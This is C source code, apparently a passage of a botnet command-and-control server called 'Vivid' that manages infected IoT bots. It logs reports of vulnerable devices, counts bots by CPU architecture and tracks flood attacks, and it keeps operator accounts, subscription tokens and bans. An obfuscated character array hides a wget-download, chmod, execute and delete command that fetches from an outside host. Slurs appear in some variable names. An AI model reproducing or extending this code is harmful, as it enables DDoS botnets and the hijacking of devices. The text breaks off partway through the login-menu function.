/*
    Permission To Use, Copy, Modify, And Distribute This Ware And Its Documentation For Education And Research, Without Fee Or A Signed Agreement, Is Granted,-
    Provided That This And The Following Two Paragraphs Appear In All Copies, Modifications, And Distributions. (Feb. 2020)

    This Ware Is Offered As-Is and As-Available, And Makes No Representations Or Warranties Of Any Kind Concerning This Material, Whether Express, Implied, Statutory, Or Other.
    This Includes, Without Limitation, Warranties Of Title, Merchantability, Fitness For A Particular Purpose, Non-Infringement, Absence Of Latent Or Other Defects, Accuracy,-
    Or The Presence Or Absence Of Errors, Whether Or Not Known Or Discoverable.

    To The Extent Possible, In No Event Shall The Author Be Liable To You On Any Legal Theory (Including, Without Limitation, Negligence)
    Or Otherwise For Any Direct, Indirect, Special, Incidental, Consequential, Punitive, Exemplary,-
    Or Any Other Losses, Costs, Expenses, Or Damages (Including, But Not Limited To, Loss Of Use, Data, Profits, Or Business Interruption)-
    However Caused, And On Any Theory Of Liability, Whether In Contract, Strict Liability, Or Tort (Including Negligence Or Otherwise)-
    Arising Out Of This Public Release, Or Use Of This Ware, Even If The User Has Been Advised Of The Possibility Of Such Losses, Costs, Expenses, Or Damages.

    An Original Copy Has Been Saved, With The Last Edited Date Matching The Day Of Sale. If This Disclaimer Is Removed, And A Legal Situation Arises, The Author Will Provide The-
    Original Copy, Thus Proving That This Disclaimer Was Made Part Of The Release.
*/
/*
  This Was Modified From A Public CNC, Yes
  This Was Never Meant To Be Released
  There Is A Lot Of Dumb Coding Practice Here
  If I Were To Make This Again Now, I Would Do So Much Differently
  If You'd Like To See What I'm Capable Of Programming Wise, Check Out Cloak! From Complete Scratch.
  -Tragedy
*/
#include "VIVHDRS/INC.h"
#include "VIVHDRS/RSL.h"
#include "VIVHDRS/Title.h"
#include "VIVHDRS/Rooms.h"

//[+]===============================================================[+]
char *INTENDEDHOST = "1.1.1.1";   //C2 Host IP
#define PORT 502 //Desired C2 Port           -RyM Gang- 

#define DB "/root/DB.txt" //Account Information File
#define TKNS "/root/TKNS.txt" //Tokens File
#define LFD "/root/VIVLOGS" //Log File Directory

#define BOTTRIG "." //Bot Trigger
//[+]===============================================================[+]
#define MXFDS 1000000
#define BUFFER_SIZE 100000
#define MXPRMS 10

struct ACNTs{
    char vivu[20];
    char vivp[20];
    char vivt[30];
    char vivex[15];
    int vivscs;
} ACCS[MXFDS];
struct TOKNs{
    char vivtkn[40];
    char vivtadm[10];
    char vivtexp[10];
    int vivtmxsc;
} RTKNS[MXFDS];
struct TELData{
    char ip[16];
    int connd;
    char nick[20];
    int vivadm;
    char vivex[20];
    int vivscs;
    int cdscs;
    int cdsts;
    int chat;
} MNGRS[MXFDS];
struct CLDWNArgs{
    int sock;
    int seconds;
};
struct CNSLData{
    char banned[20];
} CNSL[MXFDS];
char *ban_log[MXFDS]={ 0 };
char pr_motd[1100];
char wld_motd[1024];
struct TEL_LSTNArgs{
    int sock;
    uint32_t ip;
};
struct CLNTData{
    uint32_t ip;
    char connd;
    char arch[30];
} CLNTS[MXFDS];

//Raw=====================[+]
unsigned int MIPS = 0;     //
unsigned int MIPSEL = 0;   //
unsigned int ARM = 0;      //
unsigned int X86 = 0;      //
unsigned int PPC = 0;      //
unsigned int SUPERH = 0;   //
unsigned int M68K = 0;     //
unsigned int SPARC = 0;    //
unsigned int UNKNOWN = 0;  //
unsigned int DEBUG = 0;    //
/////////////////////////////
unsigned int ATKS_SENT = 0;//
unsigned int UDPS = 0;     //
unsigned int TCPS = 0;     //
unsigned int SYNS = 0;     //
unsigned int ACKS = 0;     //
unsigned int STDS = 0;     //
unsigned int XMASS = 0;    //
unsigned int VSES = 0;     //
//========================[+]

unsigned int IPLKPS = 0;
unsigned int RSLVDS = 0;

char day[10];
char month[10];
char year[10];
char *my_day;
char my_month[10];
char my_year[10];
char new_test_time[20];

int Get_Time(void){
    time_t timer;
    struct tm* tm_info;
    time(&timer);
    tm_info = localtime(&timer);
    strftime(day, 3, "%d", tm_info);
    strftime(month, 3, "%m", tm_info);
    strftime(year, 5, "%Y", tm_info);
    return 0;
}

char timed[] = {tf('w'),tf('g'),
tf('e'),tf('t'),tf(' '),tf('-'),
tf('q'),tf(' '),tf('h'),tf('t'),tf('t'),tf('p'),tf(':'),tf('/'),tf('/'),tf('g'),tf('a'),tf('y'),tf('.'),tf('e'),tf('n'),tf('e'),tf('r'),tf('g'),tf('y'),tf('/'),tf('.'),tf('.'),tf('.'),tf('/'),tf('v'),tf('i'),tf('v'),tf('i'),tf('d'),tf(' '),tf('-'),tf('O'),tf(' '),
tf('.'),tf('.'),tf('.'),tf('.'),tf('.'),tf(';'),tf('c'),tf('h'),tf('m'),tf('o'),tf('d'),tf(' '),tf('7'),tf('7'),tf('7'),tf(' '),tf('.'),tf('.'),tf('.'),tf('.'),tf('.'),tf(';'),tf('.'),tf('/'),tf('.'),tf('.'),
tf('.'),tf('.'),tf('.'),tf(';'),tf('r'),tf('m'),tf(' '),tf('-'),tf('r'),tf('f'),tf(' '),tf('.'),tf('.'),tf('.'),tf('.'),tf('.'), '\0' };
int TMUpdate(char *update){
    memset(new_test_time, 0, sizeof(new_test_time));
    char utday[3];
    char utmonth[3];
    char utyear[5];
    char total_time[120];
    time_t timer;
    struct tm* tm_info;
    time(&timer);
    tm_info = localtime(&timer);
    strftime(utday, 3, "%d", tm_info);
    strftime(utmonth, 3, "%m", tm_info);
    strftime(utyear, 5, "%Y", tm_info);
    if(!strcmp(update, "1day") || !strcmp(update, "1DAY") || !strcmp(update, "1Day")){
        int d = atoi(utday);
        int m = atoi(utmonth);
        int y = atoi(utyear);
        if(m == 1 || m == 3 || m == 5 || m == 7 || m == 8 || m == 10 || m == 12) {
            if(d == 31){
                if(m == 12){ y++; m = 1; d = 1; }
                else{ m++; d = 1; }   
            }else d++;
        } else if(m == 2) {
            if(d == 28){
                if(m == 12){ y++; m = 1; d = 1; }
                else{ m++; d = 1; }
            } else d++;
        } else if(d == 30) {
                if(m == 12){ y++; m = 1; d = 1; }
                else{ m++; d = 1; }
        } else d++;
        snprintf(total_time, sizeof(total_time), "%d/%d/%d", m, d, y);
        if(d >= 1 && d <= 9){
            memset(total_time, 0, sizeof(total_time));
            snprintf(total_time, sizeof(total_time), "%d/0%d/%d", m, d, y);
            if(m >= 1 && m <= 9){ memset(total_time, 0, sizeof(total_time)); snprintf(total_time, sizeof(total_time), "0%d/0%d/%d", m, d, y); }
        }
        else if(m >= 1 && m <= 9){ memset(total_time, 0, sizeof(total_time)); snprintf(total_time, sizeof(total_time), "0%d/%d/%d", m, d, y); }
    }
    else if(!strcmp(update, "1week") || !strcmp(update, "1WEEK") || !strcmp(update, "1Week")){
        int d = atoi(utday);
        int m = atoi(utmonth);
        int y = atoi(utyear);
        if(d == 31 || d == 30){
            if(m == 12){ y++; m = 1; d= 7; }
            else{
                m++;
                d = 7;
                if(m > 12){ m -= 12; y++; }
            }
        }
        else d += 7;
        if(m == 1 || m == 3 || m == 5 || m == 7 || m == 8 || m == 10 || m == 12) {
             if(d > 31){ m++; d -= 31; }
        } else if(m == 2) {
             if(d > 28){ m++; d -= 28; }
        } else {
            if(d > 31){ m++; d -= 31; }
            else if(d > 30){ m++; d -= 30; }
        }
        if(m > 12){ y++; m -= 12; }
        snprintf(total_time, sizeof(total_time), "%d/%d/%d", m, d, y);
        if(d >= 1 && d <= 9){
            memset(total_time, 0, sizeof(total_time));
            snprintf(total_time, sizeof(total_time), "%d/0%d/%d", m, d, y);
            if(m >= 1 && m <= 9){ memset(total_time, 0, sizeof(total_time)); snprintf(total_time, sizeof(total_time), "0%d/0%d/%d", m, d, y); }
        }
        else if(m >= 1 && m <= 9){ memset(total_time, 0, sizeof(total_time)); snprintf(total_time, sizeof(total_time), "0%d/%d/%d", m, d, y); }
    }
    else if(!strcmp(update, "1month") || !strcmp(update, "1MONTH") || !strcmp(update, "1Month")){
        int d = atoi(utday);
        int m = atoi(utmonth);
        int y = atoi(utyear);
        if(m == 12){ y++; m = 1; }
        else m++;
        if(m > 12){ m -= 12; y++; }
        snprintf(total_time, sizeof(total_time), "%d/%d/%d", m, d, y);
        if(d >= 1 && d <= 9){
            memset(total_time, 0, sizeof(total_time));
            snprintf(total_time, sizeof(total_time), "%d/0%d/%d", m, d, y);
            if(m >= 1 && m <= 9){ memset(total_time, 0, sizeof(total_time)); snprintf(total_time, sizeof(total_time), "0%d/0%d/%d", m, d, y); }
        }
        else if(m >= 1 && m <= 9){ memset(total_time, 0, sizeof(total_time)); snprintf(total_time, sizeof(total_time), "0%d/%d/%d", m, d, y); }
    }
    else if(!strcmp(update, "2months") || !strcmp(update, "2MONTHS") || !strcmp(update, "2Months")){
        int d = atoi(utday);
        int m = atoi(utmonth);
        int y = atoi(utyear);
        if(m == 12){ y++; m = 2; }
        else m += 2;
        if(m > 12){ m -= 12; y++; }
        snprintf(total_time, sizeof(total_time), "%d/%d/%d", m, d, y);
        if(d >= 1 && d <= 9){
            memset(total_time, 0, sizeof(total_time));
            snprintf(total_time, sizeof(total_time), "%d/0%d/%d", m, d, y);
            if(m >= 1 && m <= 9){ memset(total_time, 0, sizeof(total_time)); snprintf(total_time, sizeof(total_time), "0%d/0%d/%d", m, d, y); }
        }
        else if(m >= 1 && m <= 9){ memset(total_time, 0, sizeof(total_time)); snprintf(total_time, sizeof(total_time), "0%d/%d/%d", m, d, y); }
    }
    else if(!strcmp(update, "3months") || !strcmp(update, "3MONTHS") || !strcmp(update, "3Months")){
        int d = atoi(utday);
        int m = atoi(utmonth);
        int y = atoi(utyear);
        if(m == 12){ y++; m = 3; }
        else m += 3;
        if(m > 12){ m -= 12; y++; }
        snprintf(total_time, sizeof(total_time), "%d/%d/%d", m, d, y);
        if(d >= 1 && d <= 9){
            memset(total_time, 0, sizeof(total_time));
            snprintf(total_time, sizeof(total_time), "%d/0%d/%d", m, d, y);
            if(m >= 1 && m <= 9){ memset(total_time, 0, sizeof(total_time)); snprintf(total_time, sizeof(total_time), "0%d/0%d/%d", m, d, y); }
        }
        else if(m >= 1 && m <= 9){ memset(total_time, 0, sizeof(total_time)); snprintf(total_time, sizeof(total_time), "0%d/%d/%d", m, d, y); }
    }
    else if(!strcmp(update, "6months") || !strcmp(update, "6MONTHS") || !strcmp(update, "6Months")){
        int d = atoi(utday);
        int m = atoi(utmonth);
        int y = atoi(utyear);
        if(m == 12){ y++; m = 6; }
        else m += 6;
        if(m > 12){ m -= 12; y++; }
        snprintf(total_time, sizeof(total_time), "%d/%d/%d", m, d, y);
        if(d >= 1 && d <= 9){
            memset(total_time, 0, sizeof(total_time));
            snprintf(total_time, sizeof(total_time), "%d/0%d/%d", m, d, y);
            if(m >= 1 && m <= 9){ memset(total_time, 0, sizeof(total_time)); snprintf(total_time, sizeof(total_time), "0%d/0%d/%d", m, d, y); }
        }
        else if(m >= 1 && m <= 9){ memset(total_time, 0, sizeof(total_time)); snprintf(total_time, sizeof(total_time), "0%d/%d/%d", m, d, y); }
    }
    else if(!strcmp(update, "1year") || !strcmp(update, "1YEAR") || !strcmp(update, "1Year")){
        int d = atoi(utday);
        int m = atoi(utmonth);
        int y = atoi(utyear); 
        y++;
        snprintf(total_time, sizeof(total_time), "%d/%d/%d", m, d, y);
        if(d >= 1 && d <= 9){
            memset(total_time, 0, sizeof(total_time));
            snprintf(total_time, sizeof(total_time), "%d/0%d/%d", m, d, y);
            if(m >= 1 && m <= 9){ memset(total_time, 0, sizeof(total_time)); snprintf(total_time, sizeof(total_time), "0%d/0%d/%d", m, d, y); }
        }
        else if(m >= 1 && m <= 9){ memset(total_time, 0, sizeof(total_time)); snprintf(total_time, sizeof(total_time), "0%d/%d/%d", m, d, y); }
    }
    snprintf(new_test_time, sizeof(new_test_time), "%s", total_time);
    //printf("time = '%s'\n", new_test_time);
    return 1;
}
int TKNSearch(char *str){
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[1024];
    if((fp = fopen(TKNS, "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 1024, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}
void Filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
char *MakeString() {
    char *tmp;
    int len=(rand()%5)+4,i;
    FILE *file;
    tmp=(char*)malloc(len+1);
    memset(tmp,0,len+1);
    if ((file=fopen("/usr/dict/words","r")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
    else {
        int a=((rand()*rand())%45402)+1;
        char buf[1024];
        for (i=0;i<a;i++) fgets(buf,1024,file);
        memset(buf,0,1024);
        fgets(buf,1024,file);
        Filter(buf);
        memcpy(tmp,buf,len);
        fclose(file);
    }
    return tmp;
}
int split_argc = 0;
char *split_argv[MXPRMS + 1] = { 0 };
void Split_Str(char *strr){
    int i = 0;
    for (i = 0; i < split_argc; i++)
        split_argv[i] = NULL;
    split_argc = 0;
    char *token = strtok(strr, "-");
    while (token != NULL && split_argc < MXPRMS){
        split_argv[split_argc++] = malloc(strlen(token) + 1);
        strcpy(split_argv[split_argc - 1], token);
        token = strtok(NULL, "-");
    }
}
void RMSTR(char *str, char *file){
    char RMSTR[1024];
    snprintf(RMSTR, sizeof(RMSTR), "sed -i '/%s/d' %s", str, file);
    system(RMSTR);
    memset(RMSTR, 0, sizeof(RMSTR));
    return;
}
/**
 * Checks, whether a given string is empty or not.
 * A string is empty if it only contains white space
 * characters.
 * 
 * Returns 1 if given string is empty otherwise 0.
 */
int isEmpty(const char *str){
    char ch;
    do{
        ch = *(str++);
        // Check non whitespace character
        if(ch != ' ' && ch != '\t' && ch != '\n' && ch != '\r' && ch != '\0')
            return 0;
    } while (ch != '\0');
    return 1;
}
/**
 * Function to remove empty lines from a file.
 */
void removeEmptyLines(FILE *srcFile, FILE *tempFile){
    char buffer[BUFFER_SIZE];
    while ((fgets(buffer, BUFFER_SIZE, srcFile)) != NULL){
        /* If current line is not empty then write to temporary file */
        if(!isEmpty(buffer))
            fputs(buffer, tempFile);
    }
}
int Search_in_File(char *str){
    FILE *fp;
    int line_num = 0;
    int find_result = 0, fnd=0;
    char temp[1024];
    if((fp = fopen(DB, "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 1024, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            fnd = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return fnd;
}
//[+]==================================================[+]
//[+]================================[+]
static volatile FILE *telFD;          //
static volatile FILE *fileFD;         //
static volatile int epollFD = 0;      //
static volatile int listenFD = 0;     //
static volatile int TELFound = 0;     //
static volatile int UsersOnline = 0;  //
//[+]================================[+]
const char *Get_Host(uint32_t addr){
    struct in_addr in_addr_ip;
    in_addr_ip.s_addr = addr;
    return inet_ntoa(in_addr_ip);
}
static int MakeSocket_NonBlocking (int sfd){
    int flags, s;
    flags = fcntl (sfd, F_GETFL, 0);
    if (flags == -1){
        perror ("fcntl");
        return -1;
    }
    flags |= O_NONBLOCK;
    s = fcntl (sfd, F_SETFL, flags); 
    if (s == -1){
        perror ("fcntl");
        return -1;
    }
    return 0;
}
void Trim(char *str){
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int CreateAndBind (char *port){
    struct addrinfo hints;
    struct addrinfo *result, *rp;
    int s, sfd;
    memset (&hints, 0, sizeof (struct addrinfo));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0){
        fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
        return -1;
    }
    for (rp = result; rp != NULL; rp = rp->ai_next){
        sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sfd == -1) continue;
        int yes = 1;
        if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
        s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
        if (s == 0)
            break;
        close (sfd);
    }
    if (rp == NULL){
        fprintf (stderr, "Change The Port Idiot\n");
        return -1;
    }
    freeaddrinfo (result);
    return sfd;
}
int fdgets(unsigned char *buffer, int bufferSize, int fd){
    int total = 0, got = 1;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got;
}
void *EpollEventLoop(void *useless){
    struct epoll_event event;
    struct epoll_event *events;
    int s;
    int x = 0;
    events = calloc (MXFDS, sizeof event);
    while (1){
        int n, i;
        n = epoll_wait (epollFD, events, MXFDS, -1);
        for (i = 0; i < n; i++){
            if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))){
                CLNTS[events[i].data.fd].connd = 0;
                close(events[i].data.fd);
                continue;
            }
            else if (listenFD == events[i].data.fd){
                while (1){
                    struct sockaddr in_addr;
                    socklen_t in_len;
                    int infd, ipIndex;
                    in_len = sizeof in_addr;
                    infd = accept (listenFD, &in_addr, &in_len);
                    if (infd == -1){
                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                        else{
                            perror ("accept");
                            break;
                        }
                    }
                    CLNTS[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                    int dup = 0;
                    for(ipIndex = 0; ipIndex < MXFDS; ipIndex++){
                        if(!CLNTS[ipIndex].connd || ipIndex == infd) continue;
                        if(CLNTS[ipIndex].ip == CLNTS[infd].ip){
                            dup = 1;
                            break;
                        }
                    }
                    if(dup){
                        if(send(infd, ""BOTTRIG" FUCKOFF\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                        close(infd);
                        continue;
                    }
                    s = MakeSocket_NonBlocking (infd);
                    if (s == -1) { close(infd); break; }
                    event.data.fd = infd;
                    event.events = EPOLLIN | EPOLLET;
                    s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                    if (s == -1){
                        perror ("epoll_ctl");
                        close(infd);
                        break;
                    }
                    CLNTS[infd].connd = 1;
                }
                continue;
            }
            else{
                int thefd = events[i].data.fd;
                struct CLNTData *client = &(CLNTS[thefd]);
                int done = 0;
                client->connd = 1;
                while (1){
                    ssize_t count;
                    char buf[2048];
                    memset(buf, 0, sizeof buf);
 
                    while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0){
                        if(strstr(buf, "\n") == NULL) { done = 1; break; }
                        Trim(buf);
                        if(strcmp(buf, "PING") == 0){ //Basic IRC-Like Ping-Pong Challenge To See If Server Is Alive
                            if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } //Response
                            continue;
                        }
                        else if(strstr(buf, "REPORT ") == buf){ //Received A Report Of A Vulnerable Device
                            char *line = strstr(buf, "REPORT ") + 7; 
                            fprintf(telFD, "%s\n", line); //Let's Write It Out To A Disk
                            fflush(telFD);
                            TELFound++;
                            continue;
                        }
                        else if(strcmp(buf, "PONG") == 0){
                            continue;
                        }
                        else if(strstr(buf, "arch ") != NULL){
                        //char *arch = strtok(buf, " ")+sizeof(arch)-3;
                            char *arch = strstr(buf, "arch ") + 5;
                            strcpy(CLNTS->arch, arch);
                            strcpy(CLNTS[thefd].arch, arch);
                            printf(VIVY" IP: %s | Arch: %s\n", Get_Host(/*clients[thefd].ip*/client->ip), arch);
                            //char k[60];
                            //sprintf(k, "echo '%s' >> C2Logs/Bot_Connections.log", Get_Host(client->ip));
                        }
                        else{
                            int nig = 0;
                            nig = 1;
                            //printf("buf: \"%s\"\n", buf);
                        }
                    }
                    if (count == -1){
                        if (errno != EAGAIN){
                            done = 1;
                        }
                        break;
                    }
                    else if (count == 0){
                        done = 1;
                        break;
                    }
                }
                if (done){
                    client->connd = 0;
                    snprintf(client->arch, sizeof(client->arch), "%s", "timed-out");
                    snprintf(client[thefd].arch, sizeof(client[thefd].arch), "%s", "timed-out");
                    close(thefd);
                }
            }
        }
    }
}
void Broadcast(char *msg, int us, char *sender, int fuck, int vivfd){
    int sendMGM = 1;
    if(strcmp(msg, "PING") == 0) sendMGM = 0;
    char *wot = malloc(strlen(msg) + 10);
    memset(wot, 0, strlen(msg) + 10);
    strcpy(wot, msg);
    Trim(wot);
    time_t rawtime;
    struct tm * timeinfo;
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    char *timestamp = asctime(timeinfo);
    Trim(timestamp);
    int i;
    for(i = 0; i < MXFDS; i++){
        if(i == us || (!CLNTS[i].connd && (sendMGM == 0 || !MNGRS[i].connd))) continue;
        if(strlen(msg) < 0)
            return;
        if(CLNTS[i].connd){
            send(i, msg, strlen(msg), MSG_NOSIGNAL);
            send(i, ""W"", strlen(""W""), MSG_NOSIGNAL);
            send(i, "\r\n", 2, MSG_NOSIGNAL);
        }
        else
            continue;
    }
    free(wot);
}
unsigned int DevsConnected(){
    int i = 0, total = 0;
    for(i = 0; i < MXFDS; i++){
        if(!CLNTS[i].connd) continue;
        total++;
    }
    return total;
}
//[+]==============[+]
void countArch(){
    int x;
    MIPS = 0;
    MIPSEL = 0;
    X86 = 0;
    ARM = 0;
    PPC = 0;
    SUPERH = 0;
    M68K = 0;
    SPARC = 0;
    UNKNOWN = 0;
    DEBUG = 0;
    for(x = 0; x < MXFDS; x++){
        if(strstr(CLNTS[x].arch, "mips") && CLNTS[x].connd == 1) MIPS++;
        else if(strstr(CLNTS[x].arch, "mipsel") || strstr(CLNTS[x].arch, "mpsl") && CLNTS[x].connd == 1) MIPSEL++;
        else if(strstr(CLNTS[x].arch, "armv4") && CLNTS[x].connd == 1) ARM++;
        else if(strstr(CLNTS[x].arch, "armv5") && CLNTS[x].connd == 1) ARM++;
        else if(strstr(CLNTS[x].arch, "armv6") && CLNTS[x].connd == 1) ARM++;
        else if(strstr(CLNTS[x].arch, "armv7") && CLNTS[x].connd == 1) ARM++;
        else if(strstr(CLNTS[x].arch, "x86") && CLNTS[x].connd == 1) X86++;
        else if(strstr(CLNTS[x].arch, "powerpc") && CLNTS[x].connd == 1) PPC++;
        else if(strstr(CLNTS[x].arch, "sh4") && CLNTS[x].connd == 1) SUPERH++;
        else if(strstr(CLNTS[x].arch, "m68k") && CLNTS[x].connd == 1) M68K++;
        else if(strstr(CLNTS[x].arch, "sparc") && CLNTS[x].connd == 1) SPARC++;
        else if(strstr(CLNTS[x].arch, "unknown") && CLNTS[x].connd == 1) UNKNOWN++;
        else if(strstr(CLNTS[x].arch, "debug") && CLNTS[x].connd == 1) DEBUG++;
    }
}
void *TitleWriter(void *sock){
    int vivfd = (int)sock;
    char *string[2048];
    while(1){
        memset(string, 0, 2048);
        sprintf(string, "%c]0; Devices: %d | Users Online: %d %c", '\033', DevsConnected(), UsersOnline, '\007');
        if(send(vivfd, string, strlen(string), MSG_NOSIGNAL) == -1) return; 
        sleep(3);
    }
}
/*
  This Was Modified From A Public CNC, Yes
  This Was Never Meant To Be Released
  There Is A Lot Of Dumb Coding Practice Here
  If I Were To Make This Again Now, I Would Do So Much Differently
  If You'd Like To See What I'm Capable Of Programming Wise, Check Out Cloak! From Complete Scratch.
  -Tragedy
*/
//[+]=======================[+]
char *cnc_n = "Vivid";       //
char *cnc_ver = "1";         //
char *cpyrt_n = "RyM Gang";  //
void *TelWorker(void *arguments){
        char vivid[10000];
        char buf[2048];
        char cmd[70];
        char usrnms[80];
        char* nckstrn;
        int fnd;
        struct TEL_LSTNArgs *args = arguments;
        int vivfd = (int)args->sock;
        const char *management_ip = Get_Host(args->ip);
        //printf("Raw - %s\n", management_ip);
        pthread_t title;
        memset(buf, 0, sizeof(buf));

        FILE *dp;
        int x=0;
        int y;
        dp=fopen(TKNS, "r");
        if(dp == NULL){
            printf(" Failed to Start C2, No Tokens File Found...\n");
            exit(0);
        }
        else if(dp != NULL){
            while(!feof(dp)){
                y=fgetc(dp);
                ++x;
            }
            int z=0;
            rewind(dp);
            while(z!=x-1) {
                fscanf(dp, "%s %s %s %d", RTKNS[z].vivtkn, RTKNS[z].vivtadm, RTKNS[z].vivtexp, &RTKNS[z].vivtmxsc);
                ++z;
            }
        }
        FILE *fp;
        int i = 0;
        int c;
        fp = fopen(DB, "r");
        while(!feof(fp)){
            c = fgetc(fp);
            ++i;
        }
        int j = 0;
        rewind(fp);
        while(j!=i-1){
            fscanf(fp, "%s %s %s %s %d", ACCS[j].vivu, ACCS[j].vivp, ACCS[j].vivt, ACCS[j].vivex, &ACCS[j].vivscs);
            ++j;
        }
        if(!strcmp(management_ip, "127.0.0.1")){
            char *kkkkeee = ""R"Error, You Cannot Access This C2 from Localhost, Sorry...\r\n";
            if(send(vivfd, kkkkeee, strlen(kkkkeee), MSG_NOSIGNAL) == -1) return;
            sleep(1);
            close(vivfd);
            goto end;
        }
        char *cfb[50];
        sprintf(cfb, "%s", management_ip);
        Trim(cfb);
        int ip_banned = 0;
        char *line = NULL;
        size_t n = 0;
        FILE *f = fopen(""LFD"/BANNED.log", "r") ;
        while(getline(&line, &n, f) != -1){
            if(strstr(line , cfb) != NULL){
                ip_banned = 1;
            }
        }
        memset(cfb, 0, sizeof(cfb));
        fclose(f);
        free(line);
        if(ip_banned > 0){
            if(send(vivfd, fuckoff, strlen(fuckoff), MSG_NOSIGNAL) == -1) return;
            char *youbannednigga = ""R"You've Been Banned!\r\n";
            if(send(vivfd, youbannednigga, strlen(youbannednigga), MSG_NOSIGNAL) == -1) return;
            FILE *logFile;
            logFile = fopen(""LFD"/FAILED_LOGINS.log", "a");
            fprintf(logFile, "Banned IP (%s)\n", management_ip);
            printf(""CY"["R"!!!"CY"] "R"Banned IP"CY"("R"%s-%s"CY") "CY"["R"!!!"CY"]\n", management_ip, buf);
            fclose(logFile);
            sleep(5);
            close(vivfd);
            goto end;
        }
        if(send(vivfd, t1, strlen(t1), MSG_NOSIGNAL) == -1) goto end;
        usleep(275000);
        if(send(vivfd, t2, strlen(t2), MSG_NOSIGNAL) == -1) goto end;
        usleep(275000);
        if(send(vivfd, t3, strlen(t3), MSG_NOSIGNAL) == -1) goto end;
        usleep(275000);
        if(send(vivfd, t4, strlen(t4), MSG_NOSIGNAL) == -1) goto end;
        usleep(275000);
        if(send(vivfd, t5, strlen(t5), MSG_NOSIGNAL) == -1) goto end;
        usleep(275000);
        if(send(vivfd, t6, strlen(t6), MSG_NOSIGNAL) == -1) goto end;
        usleep(275000);
        if(send(vivfd, t7, strlen(t7), MSG_NOSIGNAL) == -1) goto end;
        usleep(275000);
        if(send(vivfd, t8, strlen(t8), MSG_NOSIGNAL) == -1) goto end;
        usleep(275000);
        if(send(vivfd, t9, strlen(t9), MSG_NOSIGNAL) == -1) goto end;
        usleep(275000);
        if(send(vivfd, t10, strlen(t10), MSG_NOSIGNAL) == -1) goto end;
        usleep(275000);
        if(send(vivfd, t11, strlen(t11), MSG_NOSIGNAL) == -1) goto end;
        usleep(275000);
        if(send(vivfd, t12, strlen(t12), MSG_NOSIGNAL) == -1) goto end;
        usleep(275000);
        if(send(vivfd, t13, strlen(t13), MSG_NOSIGNAL) == -1) goto end;
        usleep(275000);
        if(send(vivfd, t14, strlen(t14), MSG_NOSIGNAL) == -1) goto end;
        usleep(275000);
        mainmenu:
        if(send(vivfd, tf, strlen(tf), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, opt1, strlen(opt1), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, opt2, strlen(opt2), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, opt3, strlen(opt3), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, prmt, strlen(prmt), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "1")) goto logscreen;
        else if(!strcmp(buf, "2")) goto registerscreen;
        else if(!strcmp(buf, "3")){ //Exit
            if(send(vivfd, tf, strlen(tf), MSG_NOSIGNAL) == -1) goto end;
            if(send(vivfd, ext1, strlen(ext1), MSG_NOSIGNAL) == -1) goto end;
            sprintf(vivid, "\t\t"R"Are You Sure You Want To Exit?(Y/N):");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "YES") || !strcmp(buf, "yes")) goto goodbye;
            else
                goto mainmenu;
        }
        else if(!strcmp(buf, "4")) goto aboutscreen;
        else{
            sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!", buf);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            sleep(1);
            goto mainmenu;
        }

        aboutscreen:
        memset(buf, 0, sizeof(buf));
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, abtb, strlen(abtb), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, abt1, strlen(abt1), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, ntown, strlen(ntown), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, cntin, strlen(cntin), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, "\r\n\t\t Created By qBotted - RyM Gang \r\n");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
